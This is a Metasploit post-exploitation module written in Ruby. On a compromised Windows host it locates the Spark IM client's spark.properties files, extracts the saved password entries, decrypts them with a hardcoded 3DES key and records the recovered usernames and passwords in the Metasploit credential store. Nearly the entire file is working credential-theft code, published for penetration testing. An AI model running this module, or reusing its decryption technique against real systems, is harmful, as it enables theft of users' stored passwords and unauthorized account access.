##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Windows Gather Spark IM Password Extraction',
      'Description'    => %q{
            This module will enumerate passwords stored by the Spark IM client.
          The encryption key is publicly known. This module will not only extract encrypted
          password but will also decrypt password using public key.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
        ],
      'SessionTypes'   => [ 'meterpreter' ],
      'References'     =>
        [
          [ 'URL', 'http://adamcaudill.com/2012/07/27/decrypting-spark-saved-passwords/']
        ]
    ))
  end

  # decrypt spark password
  def decrypt(hash)
    # code to decrypt hash with KEY
    encrypted = hash.unpack("m")[0]
    key = "ugfpV1dMC5jyJtqwVAfTpHkxqJ0+E0ae".unpack("m")[0]

    cipher = OpenSSL::Cipher.new 'des-ede3'
    cipher.decrypt
    cipher.key = key

    password = cipher.update encrypted
    password << cipher.final

    password = ::Rex::Text.to_utf8(password)

    user, pass = password.scan(/[[:print:]]+/)
    cred_opts = {}
    if pass.nil? or pass.empty?
      print_status("Username found: #{user}, but no password")
      cred_opts.merge!(user: user)
    else
      print_good("Decrypted Username #{user} Password: #{pass}")
      cred_opts.merge!(user: user, password: pass)
    end

    cred_opts.merge!(
      ip: client.sock.peerhost,
      port: 5222,
      service_name: 'spark'
    )

    report_cred(cred_opts)
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      session_id: session_db_id,
      origin_type: :session,
      username: opts[:user],
      private_type: :password
    }.merge(service_data)

    if opts[:password]
      credential_data.merge!(
        private_data: opts[:password],
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # main control method
  def run
    grab_user_profiles().each do |user|
      unless user['AppData'].nil?
        accounts = user['AppData'] + "\\Spark\\spark.properties"

        # open the file for reading
        config = client.fs.file.new(accounts, 'r') rescue nil
        next if config.nil?
        print_status("Config found for user #{user['UserName']}")

        # read the contents of file
        contents = config.read

        # look for lines containing string 'password'
        password = contents.split("\n").grep(/password/)
        if password.nil?
          # file doesn't contain a password
          print_status("#{file} does not contain any saved passwords")
          # close file and return
          config.close
          return
        end

        # store the hash close the file
        password = password.delete_if {|e| e !~ /password.+=.+=\r/}
        password.each do | pass |
          if pass.nil?
            next
          end

          hash = pass.split("password").join.chomp
          vprint_status("Spark password hash: #{hash}")

          # call method to decrypt hash
          decrypt(hash)
        end
        config.close
      end
    end
  end
end
